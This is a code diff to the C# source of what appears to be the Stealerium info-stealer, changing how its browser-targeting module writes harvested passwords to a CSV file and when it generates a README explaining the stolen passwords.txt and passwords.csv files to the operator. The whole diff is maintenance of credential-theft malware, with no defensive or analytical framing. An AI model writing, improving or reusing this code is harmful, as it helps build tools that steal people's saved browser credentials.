@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using Stealerium.Stub.Helpers;
+using Stealerium.Stub.Target.Browsers.Chromium;
 
 namespace Stealerium.Stub.Target.Browsers
 {
@@ -226,21 +228,24 @@ namespace Stealerium.Stub.Target.Browsers
         {
             try
             {
-                // Open the CSV file for writing
-                using (var writer = new StreamWriter(sFile))
+                // Filter out passwords with empty usernames or passwords
+                var validPasswords = pPasswords.Where(p => !string.IsNullOrEmpty(p.Username) && !string.IsNullOrEmpty(p.Pass)).ToList();
+
+                // Only proceed if there are valid passwords
+                if (validPasswords.Any())
                 {
-                    // Write CSV headers
-                    writer.WriteLine("Hostname,Username,Password");
-
-                    // Loop through each password entry and write it in CSV format
-                    foreach (var pPassword in pPasswords)
+                    // Open the CSV file for writing
+                    using (var writer = new StreamWriter(sFile))
                     {
-                        // Skip entries with empty usernames or passwords
-                        if (string.IsNullOrEmpty(pPassword.Username) || string.IsNullOrEmpty(pPassword.Pass))
-                            continue;
+                        // Write CSV headers
+                        writer.WriteLine("Hostname,Username,Password");
 
-                        // Write password entry in CSV format
-                        writer.WriteLine(FormatPasswordCsv(pPassword));
+                        // Loop through each valid password entry and write it in CSV format
+                        foreach (var pPassword in validPasswords)
+                        {
+                            // Write password entry in CSV format
+                            writer.WriteLine(FormatPasswordCsv(pPassword));
+                        }
                     }
                 }
             }
@@ -254,57 +259,61 @@ namespace Stealerium.Stub.Target.Browsers
         /// Creates a README.txt file explaining the format options (TXT and CSV).
         /// </summary>
         /// <param name="directoryPath">Directory where the README file will be created.</param>
-        public static void CreateReadme(string directoryPath)
+        public static void CreateReadme(string directoryPath, List<Password> passwords)
         {
-            var readmeContent = @"
----------------------------------------
-   Passwords in txt and csv format?
----------------------------------------
-Both formats contain the same data, but the structure is different. You can choose to use the one that best suits your needs:
+            // Check if there are any valid passwords
+            if (passwords != null && passwords.Any(p => !string.IsNullOrEmpty(p.Username) && !string.IsNullOrEmpty(p.Pass)))
+            {
+                var readmeContent = @"
+                    ---------------------------------------
+                       Passwords in txt and csv format?
+                    ---------------------------------------
+                    Both formats contain the same data, but the structure is different. You can choose to use the one that best suits your needs:
 
-1. **passwords.txt**
-   - This file contains the passwords in a plain text format, with each password listed in a more human-readable style.
-   - Recommended if you prefer to quickly view the data without needing any special tools.
+                    1. **passwords.txt**
+                       - This file contains the passwords in a plain text format, with each password listed in a more human-readable style.
+                       - Recommended if you prefer to quickly view the data without needing any special tools.
 
-   Format:
-   Hostname: example.com
-   Username: user@example.com
-   Password: your_password
+                       Format:
+                       Hostname: example.com
+                       Username: user@example.com
+                       Password: your_password
 
-2. **passwords.csv**
-   - This file is structured in a **CSV (Comma Separated Values)** format.
-   - Recommended if you want to import the data into spreadsheet software like Microsoft Excel, Google Sheets, or any other CSV-supporting tool.
-   - Each row represents a password entry with columns for Hostname, Username, and Password.
+                    2. **passwords.csv**
+                       - This file is structured in a **CSV (Comma Separated Values)** format.
+                       - Recommended if you want to import the data into spreadsheet software like Microsoft Excel, Google Sheets, or any other CSV-supporting tool.
+                       - Each row represents a password entry with columns for Hostname, Username, and Password.
 
-   Format:
-   Hostname,Username,Password
-   example.com,user@example.com,your_password
+                       Format:
+                       Hostname,Username,Password
+                       example.com,user@example.com,your_password
 
----------------------------------------
-            WHICH ONE TO USE?
----------------------------------------
+                    ---------------------------------------
+                                WHICH ONE TO USE?
+                    ---------------------------------------
 
-- Use **passwords.txt** if:
-  - You just want a quick, easy-to-read list of passwords.
-  - You are not planning to import the data into other software.
+                    - Use **passwords.txt** if:
+                      - You just want a quick, easy-to-read list of passwords.
+                      - You are not planning to import the data into other software.
 
-- Use **passwords.csv** if:
-  - You want to import the data into Excel or any CSV-compatible software.
-  - You prefer a structured format for programmatic use or data analysis.
+                    - Use **passwords.csv** if:
+                      - You want to import the data into Excel or any CSV-compatible software.
+                      - You prefer a structured format for programmatic use or data analysis.
 
----------------------------------------
-       HOW TO OPEN THESE FILES?
----------------------------------------
+                    ---------------------------------------
+                           HOW TO OPEN THESE FILES?
+                    ---------------------------------------
 
-- **passwords.txt**:
-  - You can open this file with any text editor like Notepad (Windows), TextEdit (Mac), or any code editor like Visual Studio Code or Sublime Text.
+                    - **passwords.txt**:
+                      - You can open this file with any text editor like Notepad (Windows), TextEdit (Mac), or any code editor like Visual Studio Code or Sublime Text.
 
-- **passwords.csv**:
-  - This file can be opened with spreadsheet software like Microsoft Excel, Google Sheets, or any tool that supports CSV files.
----------------------------------------
-";
+                    - **passwords.csv**:
+                      - This file can be opened with spreadsheet software like Microsoft Excel, Google Sheets, or any tool that supports CSV files.
+                    ---------------------------------------
+                    ";
 
-            File.WriteAllText(Path.Combine(directoryPath, "README.txt"), readmeContent);
+                File.WriteAllText(Path.Combine(directoryPath, "README.txt"), readmeContent);
+            }
         }
 
         /// <summary>
